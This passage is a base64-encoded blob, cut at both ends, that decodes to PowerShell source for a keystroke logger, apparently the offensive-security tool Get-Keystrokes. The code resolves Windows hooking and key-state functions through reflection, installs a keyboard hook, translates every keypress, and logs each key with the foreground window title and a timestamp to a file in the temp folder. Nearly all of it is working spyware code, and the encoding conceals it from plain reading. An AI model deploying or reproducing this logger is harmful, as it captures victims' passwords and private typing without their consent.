25kYXkuY29tLwogICAgaHR0cHM6Ly9naXRodWIuY29tL3NlY2Fic3RyYWN0aW9uCiM+CiAgICBbQ21kbGV0QmluZGluZygpXSAKICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCldCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHtUZXN0LVBhdGggKFJlc29sdmUtUGF0aCAoU3BsaXQtUGF0aCAtUGFyZW50IC1QYXRoICRfKSkgLVBhdGhUeXBlIENvbnRhaW5lcn0pXQogICAgICAgIFtTdHJpbmddJExvZ1BhdGggPSAiJCgkZW52OlRFTVApXGtleS5sb2ciLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldCiAgICAgICAgW0RvdWJsZV0kVGltZW91dCwKCiAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgIFtTd2l0Y2hdJFBhc3NUaHJ1CiAgICApCgogICAgJExvZ1BhdGggPSBKb2luLVBhdGggKFJlc29sdmUtUGF0aCAoU3BsaXQtUGF0aCAtUGFyZW50ICRMb2dQYXRoKSkgKFNwbGl0LVBhdGggLUxlYWYgJExvZ1BhdGgpCgogICAgdHJ5IHsgJyJUeXBlZEtleSIsIldpbmRvd1RpdGxlIiwiVGltZSInIHwgT3V0LUZpbGUgLUZpbGVQYXRoICRMb2dQYXRoIC1FbmNvZGluZyB1bmljb2RlIH0KICAgIGNhdGNoIHsgdGhyb3cgJF8gfQoKICAgICRTY3JpcHQgPSB7CiAgICAgICAgUGFyYW0gKAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCldCiAgICAgICAgICAgIFtTdHJpbmddJExvZ1BhdGgsCgogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldCiAgICAgICAgICAgIFtEb3VibGVdJFRpbWVvdXQKICAgICAgICApCgogICAgICAgIGZ1bmN0aW9uIGxvY2FsOkdldC1EZWxlZ2F0ZVR5cGUgewogICAgICAgICAgICBQYXJhbSAoCiAgICAgICAgICAgICAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgICAgICAgICAKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCldCiAgICAgICAgICAgICAgICBbVHlwZVtdXQogICAgICAgICAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLAogICAgICAgICAgICAKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSApXQogICAgICAgICAgICAgICAgW1R5cGVdCiAgICAgICAgICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQogICAgICAgICAgICApCgogICAgICAgICAgICAkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KICAgICAgICAgICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKQogICAgICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCiAgICAgICAgICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkKICAgICAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQogICAgICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpCiAgICAgICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAgICAgICAgICRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKQogICAgICAgICAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAKICAgICAgICAgICAgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBsb2NhbDpHZXQtUHJvY0FkZHJlc3MgewogICAgICAgICAgICBQYXJhbSAoCiAgICAgICAgICAgICAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldCiAgICAgICAgCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAgICAgJE1vZHVsZSwKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAgICAgJFByb2NlZHVyZQogICAgICAgICAgICApCgogICAgICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byBTeXN0ZW0uZGxsIGluIHRoZSBHQUMKICAgICAgICAgICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKICAgICAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQogICAgICAgICAgICAkVW5zYWZlTmF0aXZlTWV0aG9kcyA9ICRTeXN0ZW1Bc3NlbWJseS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpCiAgICAgICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMKICAgICAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRQcm9jQWRkcmVzcycpCiAgICAgICAgICAgICMgR2V0IGEgaGFuZGxlIHRvIHRoZSBtb2R1bGUgc3BlY2lmaWVkCiAgICAgICAgICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKICAgICAgICAgICAgJHRtcFB0ciA9IE5ldy1PYmplY3QgSW50UHRyCiAgICAgICAgICAgICRIYW5kbGVSZWYgPSBOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSkKICAgICAgICAKICAgICAgICAgICAgIyBSZXR1cm4gdGhlIGFkZHJlc3Mgb2YgdGhlIGZ1bmN0aW9uCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0kSGFuZGxlUmVmLCAkUHJvY2VkdXJlKSkKICAgICAgICB9CgogICAgICAgICNyZWdpb24gSW1wb3J0cwoKICAgICAgICBbdm9pZF1bUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoJ1N5c3RlbS5XaW5kb3dzLkZvcm1zJykKCiAgICAgICAgIyBTZXRXaW5kb3dzSG9va0V4CiAgICAgICAgJFNldFdpbmRvd3NIb29rRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgU2V0V2luZG93c0hvb2tFeEEKICAgICAgJFNldFdpbmRvd3NIb29rRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50MzJdLCBbTXVsdGljYXN0RGVsZWdhdGVdLCBbSW50UHRyXSwgW0ludDMyXSkgKFtJbnRQdHJdKQogICAgICAkU2V0V2luZG93c0hvb2tFeCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFNldFdpbmRvd3NIb29rRXhBZGRyLCAkU2V0V2luZG93c0hvb2tFeERlbGVnYXRlKQoKICAgICAgICAjIENhbGxOZXh0SG9va0V4CiAgICAgICAgJENhbGxOZXh0SG9va0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIENhbGxOZXh0SG9va0V4CiAgICAgICRDYWxsTmV4dEhvb2tFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgJENhbGxOZXh0SG9va0V4ID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ2FsbE5leHRIb29rRXhBZGRyLCAkQ2FsbE5leHRIb29rRXhEZWxlZ2F0ZSkKCiAgICAgICAgIyBVbmhvb2tXaW5kb3dzSG9va0V4CiAgICAgICAgJFVuaG9va1dpbmRvd3NIb29rRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgVW5ob29rV2luZG93c0hvb2tFeAogICAgICAkVW5ob29rV2luZG93c0hvb2tFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW1ZvaWRdKQogICAgICAkVW5ob29rV2luZG93c0hvb2tFeCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFVuaG9va1dpbmRvd3NIb29rRXhBZGRyLCAkVW5ob29rV2luZG93c0hvb2tFeERlbGVnYXRlKQoKICAgICAgICAjIFBlZWtNZXNzYWdlCiAgICAgICAgJFBlZWtNZXNzYWdlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIFBlZWtNZXNzYWdlQQogICAgICAkUGVla01lc3NhZ2VEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbVm9pZF0pCiAgICAgICRQZWVrTWVzc2FnZSA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFBlZWtNZXNzYWdlQWRkciwgJFBlZWtNZXNzYWdlRGVsZWdhdGUpCgogICAgICAgICMgR2V0QXN5bmNLZXlTdGF0ZQogICAgICAgICRHZXRBc3luY0tleVN0YXRlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIEdldEFzeW5jS2V5U3RhdGUKICAgICAgJEdldEFzeW5jS2V5U3RhdGVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbV2luZG93cy5Gb3Jtcy5LZXlzXSkgKFtJbnQxNl0pCiAgICAgICRHZXRBc3luY0tleVN0YXRlID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0QXN5bmNLZXlTdGF0ZUFkZHIsICRHZXRBc3luY0tleVN0YXRlRGVsZWdhdGUpCgogICAgICAgICMgR2V0Rm9yZWdyb3VuZFdpbmRvdwogICAgICAgICRHZXRGb3JlZ3JvdW5kV2luZG93QWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIEdldEZvcmVncm91bmRXaW5kb3cKICAgICAgJEdldEZvcmVncm91bmRXaW5kb3dEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQCgpIChbSW50UHRyXSkKICAgICAgJEdldEZvcmVncm91bmRXaW5kb3cgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRGb3JlZ3JvdW5kV2luZG93QWRkciwgJEdldEZvcmVncm91bmRXaW5kb3dEZWxlZ2F0ZSkKCiAgICAgICAgIyBHZXRXaW5kb3dUZXh0CiAgICAgICAgJEdldFdpbmRvd1RleHRBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgR2V0V2luZG93VGV4dEEKICAgICAgJEdldFdpbmRvd1RleHREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1RleHQuU3RyaW5nQnVpbGRlcl0sIFtJbnQzMl0pIChbVm9pZF0pCiAgICAgICRHZXRXaW5kb3dUZXh0ID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0V2luZG93VGV4dEFkZHIsICRHZXRXaW5kb3dUZXh0RGVsZWdhdGUpCgogICAgICAgICMgR2V0TW9kdWxlSGFuZGxlCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEdldE1vZHVsZUhhbmRsZUEKICAgICAgJEdldE1vZHVsZUhhbmRsZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtTdHJpbmddKSAoW0ludFB0cl0pCiAgICAgICRHZXRNb2R1bGVIYW5kbGUgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRNb2R1bGVIYW5kbGVBZGRyLCAkR2V0TW9kdWxlSGFuZGxlRGVsZWdhdGUpCiAgICAKICAgICAgICAjZW5kcmVnaW9uIEltcG9ydHMKCiAgICAgICAgJENhbGxiYWNrU2NyaXB0ID0gewogICAgICAgICAgICBQYXJhbSAoCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKCldCiAgICAgICAgICAgICAgICBbSW50MzJdJENvZGUsCgogICAgICAgICAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgICAgICAgICAgW0ludFB0cl0kd1BhcmFtLAoKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoKV0KICAgICAgICAgICAgICAgIFtJbnRQdHJdJGxQYXJhbQogICAgICAgICAgICApCgogICAgICAgICAgICAkS2V5cyA9IFtXaW5kb3dzLkZvcm1zLktleXNdCiAgICAgICAgCiAgICAgICAgICAgICRNc2dUeXBlID0gJHdQYXJhbS5Ub0ludDMyKCkKCiAgICAgICAgICAgICMgUHJvY2VzcyBXTV9LRVlET1dOICYgV01fU1lTS0VZRE9XTiBtZXNzYWdlcwogICAgICAgICAgICBpZiAoJENvZGUgLWdlIDAgLWFuZCAoJE1zZ1R5cGUgLWVxIDB4MTAwIC1vciAkTXNnVHlwZSAtZXEgMHgxMDQpKSB7CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJGhXaW5kb3cgPSAkR2V0Rm9yZWdyb3VuZFdpbmRvdy5JbnZva2UoKQoKICAgICAgICAgICAgICAgICRTaGlmdFN0YXRlID0gJEdldEFzeW5jS2V5U3RhdGUuSW52b2tlKCRLZXlzOjpTaGlmdEtleSkKICAgICAgICAgICAgICAgIGlmICgoJFNoaWZ0U3RhdGUgLWJhbmQgMHg4MDAwKSAtZXEgMHg4MDAwKSB7ICRTaGlmdCA9ICR0cnVlIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkU2hpZnQgPSAkZmFsc2UgfQoKICAgICAgICAgICAgICAgICRDYXBzID0gW0NvbnNvbGVdOjpDYXBzTG9jawoKICAgICAgICAgICAgICAgICMgUmVhZCB2aXJ0dWFsLWtleSBmcm9tIGJ1ZmZlcgogICAgICAgICAgICAgICAgJHZLZXkgPSBbV2luZG93cy5Gb3Jtcy5LZXlzXVtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVhZEludDMyKCRsUGFyYW0pCgogICAgICAgICAgICAgICAgIyBQYXJzZSB2aXJ0dWFsLWtleQogICAgICAgICAgICAgICAgaWYgKCR2S2V5IC1ndCA2NCAtYW5kICR2S2V5IC1sdCA5MSkgeyAjIEFscGhhYmV0IGNoYXJhY3RlcnMKICAgICAgICAgICAgICAgICAgICBpZiAoJFNoaWZ0IC14b3IgJENhcHMpIHsgJEtleSA9ICR2S2V5LlRvU3RyaW5nKCkgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgeyAkS2V5ID0gJHZLZXkuVG9TdHJpbmcoKS5Ub0xvd2VyKCkgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkdktleSAtZ2UgOTYgLWFuZCAkdktleSAtbGUgMTExKSB7ICMgTnVtYmVyIHBhZCBjaGFyYWN0ZXJzCiAgICAgICAgICAgICAgICAgICAgc3dpdGNoICgkdktleS52YWx1ZV9fKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIDk2IHsgJEtleSA9ICcwJyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDk3IHsgJEtleSA9ICcxJyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDk4IHsgJEtleSA9ICcyJyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDk5IHsgJEtleSA9ICczJyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwMCB7ICRLZXkgPSAnNCcgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDEgeyAkS2V5ID0gJzUnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTAyIHsgJEtleSA9ICc2JyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwMyB7ICRLZXkgPSAnNycgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDQgeyAkS2V5ID0gJzgnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTA1IHsgJEtleSA9ICc5JyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwNiB7ICRLZXkgPSAiKiIgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDcgeyAkS2V5ID0gIisiIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTA4IHsgJEtleSA9ICJ8IiB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwOSB7ICRLZXkgPSAiLSIgfQogICAgICAgICAgICAgICAgICAgICAgICAxMTAgeyAkS2V5ID0gIi4iIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTExIHsgJEtleSA9ICIvIiB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgoJHZLZXkgLWdlIDQ4IC1hbmQgJHZLZXkgLWxlIDU3KSAtb3IgKCR2S2V5IC1nZSAxODYgLWFuZCAkdktleSAtbGUgMTkyKSAtb3IgKCR2S2V5IC1nZSAyMTkgLWFuZCAkdktleSAtbGUgMjIyKSkgeyAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAoJFNoaWZ0KSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoJHZLZXkudmFsdWVfXykgeyAjIFNoaWZ0YWJsZSBjaGFyYWN0ZXJzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA0OCB7ICRLZXkgPSAnKScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNDkgeyAkS2V5ID0gJyEnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUwIHsgJEtleSA9ICdAJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1MSB7ICRLZXkgPSAnIycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTIgeyAkS2V5ID0gJyQnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUzIHsgJEtleSA9ICclJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1NCB7ICRLZXkgPSAnXicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTUgeyAkS2V5ID0gJyYnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU2IHsgJEtleSA9ICcqJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1NyB7ICRLZXkgPSAnKCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTg2IHsgJEtleSA9ICc6JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxODcgeyAkS2V5ID0gJysnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4OCB7ICRLZXkgPSAnPCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTg5IHsgJEtleSA9ICdfJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxOTAgeyAkS2V5ID0gJz4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE5MSB7ICRLZXkgPSAnPycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTkyIHsgJEtleSA9ICd+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMTkgeyAkS2V5ID0gJ3snIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIyMCB7ICRLZXkgPSAnfCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjIxIHsgJEtleSA9ICd9JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMjIgeyAkS2V5ID0gJzxEb3VibGUgUXVvdGVzPicgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgeyAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKCR2S2V5LnZhbHVlX18pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDQ4IHsgJEtleSA9ICcwJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA0OSB7ICRLZXkgPSAnMScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTAgeyAkS2V5ID0gJzInIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUxIHsgJEtleSA9ICczJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1MiB7ICRLZXkgPSAnNCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTMgeyAkS2V5ID0gJzUnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU0IHsgJEtleSA9ICc2JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1NSB7ICRLZXkgPSAnNycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTYgeyAkS2V5ID0gJzgnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU3IHsgJEtleSA9ICc5JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxODYgeyAkS2V5ID0gJzsnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4NyB7ICRLZXkgPSAnPScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTg4IHsgJEtleSA9ICcsJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxODkgeyAkS2V5ID0gJy0nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE5MCB7ICRLZXkgPSAnLicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTkxIHsgJEtleSA9ICcvJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxOTIgeyAkS2V5ID0gJ2AnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIxOSB7ICRLZXkgPSAnWycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjIwIHsgJEtleSA9ICdcJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMjEgeyAkS2V5ID0gJ10nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIyMiB7ICRLZXkgPSAnPFNpbmdsZSBRdW90ZT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoJHZLZXkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkYxICB7ICRLZXkgPSAnPEYxPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjIgIHsgJEtleSA9ICc8RjI+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGMyAgeyAkS2V5ID0gJzxGMz4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkY0ICB7ICRLZXkgPSAnPEY0PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjUgIHsgJEtleSA9ICc8RjU+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGNiAgeyAkS2V5ID0gJzxGNj4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkY3ICB7ICRLZXkgPSAnPEY3PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjggIHsgJEtleSA9ICc8Rjg+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGOSAgeyAkS2V5ID0gJzxGOT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkYxMCB7ICRLZXkgPSAnPEYxMD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkYxMSB7ICRLZXkgPSAnPEYxMT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkYxMiB7ICRLZXkgPSAnPEYxMj4nIH0KICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpTbmFwc2hvdCAgICB7ICRLZXkgPSAnPFByaW50IFNjcmVlbj4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlNjcm9sbCAgICAgIHsgJEtleSA9ICc8U2Nyb2xsIExvY2s+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpQYXVzZSAgICAgICB7ICRLZXkgPSAnPFBhdXNlL0JyZWFrPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6SW5zZXJ0ICAgICAgeyAkS2V5ID0gJzxJbnNlcnQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpIb21lICAgICAgICB7ICRLZXkgPSAnPEhvbWU+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpEZWxldGUgICAgICB7ICRLZXkgPSAnPERlbGV0ZT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkVuZCAgICAgICAgIHsgJEtleSA9ICc8RW5kPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6UHJpb3IgICAgICAgeyAkS2V5ID0gJzxQYWdlIFVwPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6TmV4dCAgICAgICAgeyAkS2V5ID0gJzxQYWdlIERvd24+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpFc2NhcGUgICAgICB7ICRLZXkgPSAnPEVzYz4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6Ok51bUxvY2sgICAgIHsgJEtleSA9ICc8TnVtIExvY2s+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpDYXBpdGFsICAgICB7ICRLZXkgPSAnPENhcHMgTG9jaz4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlRhYiAgICAgICAgIHsgJEtleSA9ICc8VGFiPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6QmFjayAgICAgICAgeyAkS2V5ID0gJzxCYWNrc3BhY2U+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpFbnRlciAgICAgICB7ICRLZXkgPSAnPEVudGVyPicgfQogICAgICAgICAgICAgICAgICAgICAgI